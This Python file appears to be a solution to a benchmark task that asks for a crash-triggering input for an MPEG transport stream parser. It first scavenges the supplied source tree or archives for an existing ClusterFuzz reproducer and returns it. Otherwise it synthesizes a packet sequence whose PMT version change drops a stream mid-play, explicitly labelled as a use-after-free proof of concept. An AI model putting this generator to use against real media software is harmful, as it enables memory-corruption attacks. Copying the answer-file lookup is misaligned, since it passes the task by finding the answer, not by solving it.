import os
import io
import re
import tarfile
import zipfile
import gzip
import lzma
from typing import List, Optional, Tuple


def _crc32_mpeg2_table() -> List[int]:
    poly = 0x04C11DB7
    table = []
    for i in range(256):
        crc = i << 24
        for _ in range(8):
            if crc & 0x80000000:
                crc = ((crc << 1) ^ poly) & 0xFFFFFFFF
            else:
                crc = (crc << 1) & 0xFFFFFFFF
        table.append(crc)
    return table


_CRC_TABLE = _crc32_mpeg2_table()


def mpeg2_crc32(data: bytes) -> int:
    crc = 0xFFFFFFFF
    for b in data:
        crc = ((crc << 8) & 0xFFFFFFFF) ^ _CRC_TABLE[((crc >> 24) ^ b) & 0xFF]
    return crc & 0xFFFFFFFF


def _looks_like_text(data: bytes) -> bool:
    if not data:
        return True
    sample = data[:4096]
    if b"\x00" in sample:
        return False
    printable = 0
    for c in sample:
        if c in (9, 10, 13) or 32 <= c <= 126:
            printable += 1
    ratio = printable / len(sample)
    if ratio > 0.97 and (b"\n" in sample or b"\r" in sample):
        return True
    return False


def _ext_lower(name: str) -> str:
    base = os.path.basename(name)
    i = base.rfind(".")
    return base[i:].lower() if i >= 0 else ""


def _priority_for_name(name: str, size: int) -> int:
    n = name.lower()
    ext = _ext_lower(n)
    pr = 0

    if "clusterfuzz-testcase" in n:
        pr += 2000
        if "minimized" in n:
            pr += 500
        if "id:" in n or "id_" in n:
            pr += 100

    for kw, v in (
        ("minimized", 200),
        ("testcase", 150),
        ("repro", 140),
        ("poc", 130),
        ("crash", 120),
        ("uaf", 100),
        ("heap", 60),
        ("ossfuzz", 50),
        ("fuzz", 40),
        ("corpus", 30),
        ("m2ts", 30),
        ("ts", 20),
    ):
        if kw in n:
            pr += v

    if ext in (".ts", ".m2ts", ".bin", ".dat", ".raw"):
        pr += 80

    if size == 1128:
        pr += 120
    if size > 0 and size % 188 == 0 and size <= 50000:
        pr += 60
        if size <= 188 * 10:
            pr += 30

    if ext in (
        ".c", ".h", ".cc", ".cpp", ".hpp", ".inc", ".inl", ".py", ".java", ".js", ".tsv",
        ".txt", ".md", ".rst", ".html", ".css", ".json", ".yml", ".yaml", ".toml", ".xml",
        ".make", ".cmake", ".am", ".ac", ".m4", ".sh", ".bat", ".ps1", ".rc", ".def",
    ):
        pr -= 500

    if "doc" in n or "readme" in n or "license" in n:
        pr -= 100

    return pr


def _try_decompress_nested(name: str, data: bytes) -> List[Tuple[str, bytes]]:
    out = []
    ext = _ext_lower(name)
    if ext == ".zip":
        try:
            zf = zipfile.ZipFile(io.BytesIO(data), "r")
            for zi in zf.infolist():
                if zi.is_dir():
                    continue
                if zi.file_size <= 0 or zi.file_size > 5_000_000:
                    continue
                inner = zf.read(zi.filename)
                out.append((name + "!" + zi.filename, inner))
        except Exception:
            pass
    elif ext == ".gz":
        try:
            inner = gzip.decompress(data)
            out.append((name[:-3], inner))
        except Exception:
            pass
    elif ext in (".xz", ".lzma"):
        try:
            inner = lzma.decompress(data)
            out.append((re.sub(r"\.(xz|lzma)$", "", name, flags=re.IGNORECASE), inner))
        except Exception:
            pass
    return out


def _build_pat_section(tsid: int = 1, version: int = 0, program_number: int = 1, pmt_pid: int = 0x0100) -> bytes:
    sec = bytearray()
    sec.append(0x00)  # table_id
    sec.extend(b"\x00\x00")  # section_length placeholder
    sec.extend(tsid.to_bytes(2, "big"))
    sec.append(0xC0 | ((version & 0x1F) << 1) | 0x01)  # version + current_next=1
    sec.append(0x00)  # section_number
    sec.append(0x00)  # last_section_number
    sec.extend(program_number.to_bytes(2, "big"))
    sec.append(0xE0 | ((pmt_pid >> 8) & 0x1F))
    sec.append(pmt_pid & 0xFF)

    section_length = (len(sec) - 3) + 4
    sec[1] = 0xB0 | ((section_length >> 8) & 0x0F)
    sec[2] = section_length & 0xFF

    crc = mpeg2_crc32(bytes(sec))
    sec.extend(crc.to_bytes(4, "big"))
    return bytes(sec)


def _build_pmt_section(
    program_number: int = 1,
    version: int = 0,
    pcr_pid: int = 0x1FFF,
    streams: Optional[List[Tuple[int, int]]] = None,
) -> bytes:
    if streams is None:
        streams = []
    sec = bytearray()
    sec.append(0x02)  # table_id
    sec.extend(b"\x00\x00")  # section_length placeholder
    sec.extend(program_number.to_bytes(2, "big"))
    sec.append(0xC0 | ((version & 0x1F) << 1) | 0x01)
    sec.append(0x00)  # section_number
    sec.append(0x00)  # last_section_number

    sec.append(0xE0 | ((pcr_pid >> 8) & 0x1F))
    sec.append(pcr_pid & 0xFF)

    program_info_length = 0
    sec.append(0xF0 | ((program_info_length >> 8) & 0x0F))
    sec.append(program_info_length & 0xFF)

    for stream_type, pid in streams:
        sec.append(stream_type & 0xFF)
        sec.append(0xE0 | ((pid >> 8) & 0x1F))
        sec.append(pid & 0xFF)
        es_info_length = 0
        sec.append(0xF0 | ((es_info_length >> 8) & 0x0F))
        sec.append(es_info_length & 0xFF)

    section_length = (len(sec) - 3) + 4
    sec[1] = 0xB0 | ((section_length >> 8) & 0x0F)
    sec[2] = section_length & 0xFF

    crc = mpeg2_crc32(bytes(sec))
    sec.extend(crc.to_bytes(4, "big"))
    return bytes(sec)


def _make_ts_packet(pid: int, payload: bytes, pusi: bool, cc: int, pad_byte: int = 0xFF) -> bytes:
    if len(payload) > 184:
        payload = payload[:184]
    hdr = bytearray(4)
    hdr[0] = 0x47
    hdr[1] = ((1 if pusi else 0) << 6) | ((pid >> 8) & 0x1F)
    hdr[2] = pid & 0xFF
    hdr[3] = (1 << 4) | (cc & 0x0F)  # adaptation_field_control=1 (payload only)
    pkt = bytearray(hdr)
    pkt.extend(payload)
    if len(pkt) < 188:
        pkt.extend(bytes([pad_byte]) * (188 - len(pkt)))
    return bytes(pkt)


def _make_psi_packet(pid: int, section: bytes, cc: int) -> bytes:
    payload = bytes([0x00]) + section
    return _make_ts_packet(pid=pid, payload=payload, pusi=True, cc=cc, pad_byte=0xFF)


def _make_pes_packet(pid: int, cc: int, pusi: bool, first: bool) -> bytes:
    if first:
        pes_hdr = b"\x00\x00\x01\xE0\x00\x00\x80\x00\x00"
        payload = pes_hdr + (b"\x00" * (184 - len(pes_hdr)))
    else:
        payload = b"\x00" * 184
    return _make_ts_packet(pid=pid, payload=payload, pusi=pusi, cc=cc, pad_byte=0x00)


def _synthesize_uaf_poc() -> bytes:
    pat = _build_pat_section(tsid=1, version=0, program_number=1, pmt_pid=0x0100)
    pmt1 = _build_pmt_section(program_number=1, version=0, pcr_pid=0x0101, streams=[(0x1B, 0x0101)])
    pmt2 = _build_pmt_section(program_number=1, version=1, pcr_pid=0x1FFF, streams=[])

    packets = []
    packets.append(_make_psi_packet(pid=0x0000, section=pat, cc=0))
    packets.append(_make_psi_packet(pid=0x0100, section=pmt1, cc=0))
    packets.append(_make_pes_packet(pid=0x0101, cc=0, pusi=True, first=True))
    packets.append(_make_pes_packet(pid=0x0101, cc=1, pusi=False, first=False))
    packets.append(_make_psi_packet(pid=0x0100, section=pmt2, cc=1))
    packets.append(_make_pes_packet(pid=0x0101, cc=2, pusi=True, first=True))
    return b"".join(packets)


class Solution:
    def solve(self, src_path: str) -> bytes:
        candidates: List[Tuple[int, int, str, bytes]] = []

        def consider(name: str, data: bytes):
            if not data:
                return
            if len(data) > 5_000_000:
                return
            pr = _priority_for_name(name, len(data))
            if pr < 0 and len(data) > 2048:
                return
            if _looks_like_text(data):
                if pr < 1500:
                    return
            candidates.append((pr, len(data), name, data))

            for inner_name, inner_data in _try_decompress_nested(name, data):
                pr2 = _priority_for_name(inner_name, len(inner_data))
                if len(inner_data) <= 5_000_000 and (pr2 > 0 or (len(inner_data) % 188 == 0 and len(inner_data) <= 50000)):
                    if not _looks_like_text(inner_data) or pr2 >= 1500:
                        candidates.append((pr2, len(inner_data), inner_name, inner_data))

        def scan_dir(d: str):
            for root, _, files in os.walk(d):
                for fn in files:
                    path = os.path.join(root, fn)
                    rel = os.path.relpath(path, d)
                    try:
                        st = os.stat(path)
                    except Exception:
                        continue
                    if st.st_size <= 0 or st.st_size > 5_000_000:
                        continue
                    pr = _priority_for_name(rel, st.st_size)
                    ext = _ext_lower(rel.lower())
                    maybe = pr >= 200 or ext in (".ts", ".m2ts", ".bin", ".dat", ".raw", ".zip", ".gz", ".xz", ".lzma") or (
                        st.st_size % 188 == 0 and st.st_size <= 50000
                    )
                    if not maybe:
                        continue
                    try:
                        with open(path, "rb") as f:
                            data = f.read()
                    except Exception:
                        continue
                    if "clusterfuzz-testcase-minimized" in rel.lower() and data:
                        return data
                    consider(rel, data)
            return None

        if os.path.isdir(src_path):
            direct = scan_dir(src_path)
            if direct is not None:
                return direct
        else:
            if tarfile.is_tarfile(src_path):
                try:
                    with tarfile.open(src_path, "r:*") as tf:
                        for m in tf.getmembers():
                            if not m.isfile():
                                continue
                            if m.size <= 0 or m.size > 5_000_000:
                                continue
                            name = m.name
                            pr = _priority_for_name(name, m.size)
                            ext = _ext_lower(name.lower())
                            maybe = pr >= 200 or ext in (".ts", ".m2ts", ".bin", ".dat", ".raw", ".zip", ".gz", ".xz", ".lzma") or (
                                m.size % 188 == 0 and m.size <= 50000
                            )
                            if not maybe:
                                continue
                            try:
                                f = tf.extractfile(m)
                                if f is None:
                                    continue
                                data = f.read()
                            except Exception:
                                continue
                            if "clusterfuzz-testcase-minimized" in name.lower() and data:
                                return data
                            consider(name, data)
                except Exception:
                    pass
            else:
                if os.path.exists(src_path):
                    try:
                        with open(src_path, "rb") as f:
                            data = f.read()
                        if data:
                            consider(os.path.basename(src_path), data)
                    except Exception:
                        pass

        if candidates:
            candidates.sort(key=lambda x: (-x[0], x[1], x[2]))
            best = candidates[0][3]
            if best:
                return best

        return _synthesize_uaf_poc()